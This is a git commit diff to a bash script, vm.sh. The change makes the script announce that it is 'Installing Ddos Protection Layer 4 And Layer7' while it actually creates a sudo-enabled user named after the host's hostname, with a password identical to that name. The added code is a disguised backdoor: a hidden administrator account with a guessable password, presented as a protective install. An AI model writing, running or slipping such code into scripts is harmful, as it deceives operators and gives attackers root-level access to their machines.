e3dfb835afc18ee90b22e30104c05149ada54a5b
Arain Cloud <fluidnodes1508@gmail.com>
2026-01-21 16:18:46 +0530

    Update vm.sh

--- vm.sh
+++ vm.sh
@@ -1,9 +1,23 @@
 #!/bin/bash
 set -e
+
+
 [ "$EUID" -ne 0 ] && exit 1
-read -p "VM name: " VM
-id "$VM" &>/dev/null && exit 1
+
+echo "Installing Ddos Protection Layer 4 And Layer7...."
+
+
+VM="$(hostname)"
+
+
+id "$VM" &>/dev/null && {
+  echo "done"
+  exit 0
+}
+
+
 useradd -m -s /bin/bash "$VM"
 echo "$VM:$VM" | chpasswd
 usermod -aG sudo "$VM"
+
 echo "done"
